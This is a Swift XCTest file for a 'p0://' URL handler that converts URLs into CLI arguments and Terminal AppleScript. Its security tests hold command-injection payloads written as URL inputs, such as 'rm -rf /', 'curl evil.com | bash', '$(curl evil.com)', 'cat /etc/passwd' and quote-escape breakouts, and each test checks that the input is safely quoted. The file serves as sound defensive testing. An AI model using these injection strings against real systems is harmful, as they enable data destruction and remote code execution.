import XCTest

// URL Parsing Test Cases for P0 URL Handler
// These tests verify that URLs are correctly parsed into CLI arguments

class URLParsingTests: XCTestCase {

    // Test helper function that wraps the parseURL utility
    private func parseTestURL(_ urlString: String) -> [String]? {
        guard let url = URL(string: urlString) else {
            return nil
        }
        return parseURL(url)
    }

    // Basic Tests

    func testBasicSSHCommand() {
        let url = "p0://ssh/my-host"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result, ["ssh", "my-host"])
    }

    func testSSHWithMultiplePathComponents() {
        let url = "p0://request/aws/role/admin"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result, ["request", "aws", "role", "admin"])
    }

    // Query Parameter Tests

    func testSingleQueryParameter() {
        let url = "p0://ssh/my-host?user=admin"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result, ["ssh", "my-host", "--user=admin"])
    }

    func testMultipleQueryParameters() {
        let url = "p0://ssh/my-host?user=admin&port=2222"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result, ["ssh", "my-host", "--user=admin", "--port=2222"])
    }

    func testQueryParameterWithoutValue() {
        let url = "p0://command?flag"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result, ["command", "--flag"])
    }

    func testComplexQueryParameters() {
        let url = "p0://ssh/prod-01?reason=incident-123&user=oncall&wait"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result, ["ssh", "prod-01", "--reason=incident-123", "--user=oncall", "--wait"])
    }

    // Edge Cases

    func testURLWithSpaces() {
        let url = "p0://ssh/my-host?reason=production%20issue"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result, ["ssh", "my-host", "--reason=production issue"])
    }

    func testURLWithSpecialCharacters() {
        let url = "p0://ssh/my-host?reason=bug%23123"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result, ["ssh", "my-host", "--reason=bug#123"])
    }

    func testCommandOnly() {
        let url = "p0://request"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result, ["request"])
    }

    func testEmptyURL() {
        let url = "p0://"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result, [])
    }

    // Invalid URLs

    func testInvalidScheme() {
        let url = "http://ssh/my-host"
        let result = parseTestURL(url)

        XCTAssertNil(result)
    }

    // ================================================================================
    // Security Integration Tests - Command Injection Prevention
    // ================================================================================
    //
    // These tests verify the complete security pipeline from attacker-controlled
    // URL input through to the final AppleScript that gets executed. Each test
    // shows both the parsed arguments and the resulting AppleScript to make it
    // easy to audit that potentially malicious inputs are properly neutralized.

    func testSecurityInjectionWithSemicolon() {
        // Attack: Attacker tries to terminate the command and run arbitrary code
        let maliciousURL = "p0://ssh/host?user=hacker;%20rm%20-rf%20/"

        let arguments = parseTestURL(maliciousURL)
        XCTAssertNotNil(arguments)
        XCTAssertEqual(arguments, ["ssh", "host", "--user=hacker; rm -rf /"])

        // Verify that the semicolon is safely inside the single-quotes
        let applescript = buildApplescript(arguments!)
        XCTAssertEqual(applescript, """
        tell application "Terminal"
            activate
            do script "'/usr/local/bin/p0' 'ssh' 'host' '--user=hacker; rm -rf /'"
        end tell
        """)
    }

    func testSecurityInjectionWithDoubleAmpersand() {
        // Attack: Attacker tries to chain commands with &&
        let maliciousURL = "p0://ssh/host?user=admin%20%26%26%20curl%20evil.com/malware.sh"

        let arguments = parseTestURL(maliciousURL)
        XCTAssertNotNil(arguments)
        XCTAssertEqual(arguments, ["ssh", "host", "--user=admin && curl evil.com/malware.sh"])

        // Verify that the && is safely inside the single-quotes
        let applescript = buildApplescript(arguments!)
        XCTAssertEqual(applescript, """
        tell application "Terminal"
            activate
            do script "'/usr/local/bin/p0' 'ssh' 'host' '--user=admin && curl evil.com/malware.sh'"
        end tell
        """)
    }

    func testSecurityInjectionWithBackticks() {
        // Attack: Attacker tries command substitution with backticks
        let maliciousURL = "p0://ssh/host?user=%60whoami%60"

        let arguments = parseTestURL(maliciousURL)
        XCTAssertNotNil(arguments)
        XCTAssertEqual(arguments, ["ssh", "host", "--user=`whoami`"])

        // Verify that the backticks are safely inside the single-quotes, ensuring that
        // they are passed as literals and cannot be used for command substitution
        let applescript = buildApplescript(arguments!)
        XCTAssertEqual(applescript, """
        tell application "Terminal"
            activate
            do script "'/usr/local/bin/p0' 'ssh' 'host' '--user=`whoami`'"
        end tell
        """)
    }

    func testSecurityInjectionWithDollarParentheses() {
        // Attack: Attacker tries command substitution with $()
        let maliciousURL = "p0://ssh/host?user=$(curl%20evil.com)"

        let arguments = parseTestURL(maliciousURL)
        XCTAssertNotNil(arguments)
        XCTAssertEqual(arguments, ["ssh", "host", "--user=$(curl evil.com)"])

        // Verify that the $() is safely inside the single-quotes, ensuring that
        // it is passed as literal and cannot be used for command substitution
        let applescript = buildApplescript(arguments!)
        XCTAssertEqual(applescript, """
        tell application "Terminal"
            activate
            do script "'/usr/local/bin/p0' 'ssh' 'host' '--user=$(curl evil.com)'"
        end tell
        """)
    }

    func testSecurityInjectionWithPipe() {
        // Attack: Attacker tries to pipe output to another command
        let maliciousURL = "p0://ssh/host?user=admin%20%7C%20cat%20/etc/passwd"

        let arguments = parseTestURL(maliciousURL)
        XCTAssertNotNil(arguments)
        XCTAssertEqual(arguments, ["ssh", "host", "--user=admin | cat /etc/passwd"])

        // Verify that the pipe is safely inside the single-quotes, ensuring that it
        // is passed as literal and cannot be used as a pipe operator
        let applescript = buildApplescript(arguments!)
        XCTAssertEqual(applescript, """
        tell application "Terminal"
            activate
            do script "'/usr/local/bin/p0' 'ssh' 'host' '--user=admin | cat /etc/passwd'"
        end tell
        """)
    }

    func testSecurityInjectionWithNewline() {
        // Attack: Attacker tries to inject a newline to run a second command
        let maliciousURL = "p0://ssh/host?user=admin%0Acurl%20evil.com"

        let arguments = parseTestURL(maliciousURL)
        XCTAssertNotNil(arguments)
        XCTAssertEqual(arguments, ["ssh", "host", "--user=admin\ncurl evil.com"])

        // Verify that the newline is safely inside the single-quotes, ensuring that it
        // is treated as a literal newline character in the --user argument value,
        // not as a command separator
        let applescript = buildApplescript(arguments!)
        XCTAssertEqual(applescript, """
        tell application "Terminal"
            activate
            do script "'/usr/local/bin/p0' 'ssh' 'host' '--user=admin\ncurl evil.com'"
        end tell
        """)
    }

    func testSecurityInjectionWithSingleQuotes() {
        // Attack: Attacker tries to break out of single-quote escaping
        let maliciousURL = "p0://ssh/host?user=admin'%20;%20curl%20evil.com%20;%20echo%20'"

        let arguments = parseTestURL(maliciousURL)
        XCTAssertNotNil(arguments)
        XCTAssertEqual(arguments, ["ssh", "host", "--user=admin' ; curl evil.com ; echo '"])

        // In general, this is how a single-quote gets escaped in MacOS terminals:
        // I'm -> 'I'\''m' ('I' + \' + 'm')
        //
        // The command that gets run in the terminal is: 
        // 'usr/local/bin/p0' 'ssh' 'host' '--user=admin'\'' ; curl evil.com ; echo '\'''
        //
        // The four backslashes each reduce to one backslash in the actual command:
        //  \\\\ 
        //  -> \\ (Swift string escaping encapsulated by the triple-quotes)
        //  -> \ (Applescript escaping encapsulated by the single-quotes after "do script")
        let applescript = buildApplescript(arguments!)
        XCTAssertEqual(applescript, """
        tell application "Terminal"
            activate
            do script "'/usr/local/bin/p0' 'ssh' 'host' '--user=admin'\\\\'' ; curl evil.com ; echo '\\\\'''"
        end tell
        """)
    }

    func testSecurityInjectionWithDoubleQuotes() {
        // Attack: Attacker tries to inject double quotes to break AppleScript escaping
        let maliciousURL = "p0://ssh/host?user=admin%22%20%26%20do%20shell%20script%20%22curl%20evil.com"

        let arguments = parseTestURL(maliciousURL)
        XCTAssertNotNil(arguments)
        XCTAssertEqual(arguments, ["ssh", "host", "--user=admin\" & do shell script \"curl evil.com"])

        // The \\\" is a \" after Swift string unescaping, which prevents the input from being able to escape
        // out of the "do script" string
        let applescript = buildApplescript(arguments!)
        XCTAssertEqual(applescript, """
        tell application "Terminal"
            activate
            do script "'/usr/local/bin/p0' 'ssh' 'host' '--user=admin\\\" & do shell script \\\"curl evil.com'"
        end tell
        """)
    }

    func testSecurityInjectionInHostname() {
        // Attack: Attacker tries to inject malicious characters in the hostname
        let maliciousURL = "p0://ssh;curl-evil.com/path"

        let arguments = parseTestURL(maliciousURL)
        XCTAssertNotNil(arguments)
        XCTAssertEqual(arguments, ["ssh;curl-evil.com", "path"])

        // Verify that the semicolon is safely inside the single-quotes
        let applescript = buildApplescript(arguments!)
        XCTAssertEqual(applescript, """
        tell application "Terminal"
            activate
            do script "'/usr/local/bin/p0' 'ssh;curl-evil.com' 'path'"
        end tell
        """)
    }

    func testSecurityGlobPatterns() {
        // Attack: Attacker tries glob pattern expansion
        let maliciousURL = "p0://ssh/host?user=admin*"

        let arguments = parseTestURL(maliciousURL)
        XCTAssertNotNil(arguments)
        XCTAssertEqual(arguments, ["ssh", "host", "--user=admin*"])

        // Verify that the asterisk is safely inside the single-quotes
        let applescript = buildApplescript(arguments!)
        XCTAssertEqual(applescript, """
        tell application "Terminal"
            activate
            do script "'/usr/local/bin/p0' 'ssh' 'host' '--user=admin*'"
        end tell
        """)
    }

    func testSecurityMultipleInjectionTechniques() {
        // Attack: Attacker combines multiple injection techniques
        let maliciousURL = "p0://ssh/host?user=admin;%20curl%20evil.com%20%7C%20bash%20%26"

        let arguments = parseTestURL(maliciousURL)
        XCTAssertNotNil(arguments)
        XCTAssertEqual(arguments, ["ssh", "host", "--user=admin; curl evil.com | bash &"])

        // Verify that the special characters are safely inside the single-quotes
        let applescript = buildApplescript(arguments!)
        XCTAssertEqual(applescript, """
        tell application "Terminal"
            activate
            do script "'/usr/local/bin/p0' 'ssh' 'host' '--user=admin; curl evil.com | bash &'"
        end tell
        """)
    }

    func testSecurityBackslashEscapeSequence() {
        // Attack: Attacker tries to use backslashes to break escaping
        let maliciousURL = "p0://ssh/host?user=admin\\ntest"

        let arguments = parseTestURL(maliciousURL)
        XCTAssertNotNil(arguments)
        XCTAssertEqual(arguments, ["ssh", "host", "--user=admin\\ntest"])

        // Verify that the backslash is safely inside the single-quotes
        let applescript = buildApplescript(arguments!)
        XCTAssertEqual(applescript, """
        tell application "Terminal"
            activate
            do script "'/usr/local/bin/p0' 'ssh' 'host' '--user=admin\\\\ntest'"
        end tell
        """)
    }

    func testSecurityDollarVariable() {
        // Attack: Attacker tries variable expansion
        let maliciousURL = "p0://ssh/host?user=$HOME/evil"

        let arguments = parseTestURL(maliciousURL)
        XCTAssertNotNil(arguments)
        XCTAssertEqual(arguments, ["ssh", "host", "--user=$HOME/evil"])

        // Verify that $HOME is safely inside the single-quotes, which
        // will cause it to not be expanded
        let applescript = buildApplescript(arguments!)
        XCTAssertEqual(applescript, """
        tell application "Terminal"
            activate
            do script "'/usr/local/bin/p0' 'ssh' 'host' '--user=$HOME/evil'"
        end tell
        """)
    }

    func testSecurityRedirection() {
        // Attack: Attacker tries output redirection
        let maliciousURL = "p0://ssh/host?user=admin%20%3E%20/tmp/hack"

        let arguments = parseTestURL(maliciousURL)
        XCTAssertNotNil(arguments)
        XCTAssertEqual(arguments, ["ssh", "host", "--user=admin > /tmp/hack"])

        // Verify that the redirection operator is safely inside the single-quotes
        let applescript = buildApplescript(arguments!)
        XCTAssertEqual(applescript, """
        tell application "Terminal"
            activate
            do script "'/usr/local/bin/p0' 'ssh' 'host' '--user=admin > /tmp/hack'"
        end tell
        """)
    }

    func testSecurityLegitimateComplexArguments() {
        // Verify that legitimate complex arguments still work correctly
        let url = "p0://ssh/host?reason=Investigating%20issue%20%23123%20(urgent)"

        let arguments = parseTestURL(url)
        XCTAssertNotNil(arguments)
        XCTAssertEqual(arguments, ["ssh", "host", "--reason=Investigating issue #123 (urgent)"])

        // Verify that special characters like # and parentheses are preserved correctly
        let applescript = buildApplescript(arguments!)
        XCTAssertEqual(applescript, """
        tell application "Terminal"
            activate
            do script "'/usr/local/bin/p0' 'ssh' 'host' '--reason=Investigating issue #123 (urgent)'"
        end tell
        """)
    }
}

// Test Runner (for command-line execution)

extension URLParsingTests {
    static func runAllTests() {
        let tests = URLParsingTests()

        print("Running URL Parsing Tests...")
        print("============================\n")

        let testMethods: [(String, () -> Void)] = [
            // Basic URL parsing tests
            ("testBasicSSHCommand", tests.testBasicSSHCommand),
            ("testSSHWithMultiplePathComponents", tests.testSSHWithMultiplePathComponents),
            ("testSingleQueryParameter", tests.testSingleQueryParameter),
            ("testMultipleQueryParameters", tests.testMultipleQueryParameters),
            ("testQueryParameterWithoutValue", tests.testQueryParameterWithoutValue),
            ("testComplexQueryParameters", tests.testComplexQueryParameters),
            ("testURLWithSpaces", tests.testURLWithSpaces),
            ("testURLWithSpecialCharacters", tests.testURLWithSpecialCharacters),
            ("testCommandOnly", tests.testCommandOnly),
            ("testEmptyURL", tests.testEmptyURL),
            ("testInvalidScheme", tests.testInvalidScheme),

            // Security-focused integration tests
            ("testSecurityInjectionWithSemicolon", tests.testSecurityInjectionWithSemicolon),
            ("testSecurityInjectionWithDoubleAmpersand", tests.testSecurityInjectionWithDoubleAmpersand),
            ("testSecurityInjectionWithBackticks", tests.testSecurityInjectionWithBackticks),
            ("testSecurityInjectionWithDollarParentheses", tests.testSecurityInjectionWithDollarParentheses),
            ("testSecurityInjectionWithPipe", tests.testSecurityInjectionWithPipe),
            ("testSecurityInjectionWithNewline", tests.testSecurityInjectionWithNewline),
            ("testSecurityInjectionWithSingleQuotes", tests.testSecurityInjectionWithSingleQuotes),
            ("testSecurityInjectionWithDoubleQuotes", tests.testSecurityInjectionWithDoubleQuotes),
            ("testSecurityInjectionInHostname", tests.testSecurityInjectionInHostname),
            ("testSecurityMultipleInjectionTechniques", tests.testSecurityMultipleInjectionTechniques),
            ("testSecurityBackslashEscapeSequence", tests.testSecurityBackslashEscapeSequence),
            ("testSecurityDollarVariable", tests.testSecurityDollarVariable),
            ("testSecurityGlobPatterns", tests.testSecurityGlobPatterns),
            ("testSecurityRedirection", tests.testSecurityRedirection),
            ("testSecurityLegitimateComplexArguments", tests.testSecurityLegitimateComplexArguments),
        ]

        var passed = 0
        var failed = 0

        for (name, test) in testMethods {
            do {
                test()
                print("✓ \(name)")
                passed += 1
            } catch {
                print("✗ \(name): \(error)")
                failed += 1
            }
        }

        print("\n============================")
        print("Results: \(passed) passed, \(failed) failed")
    }
}
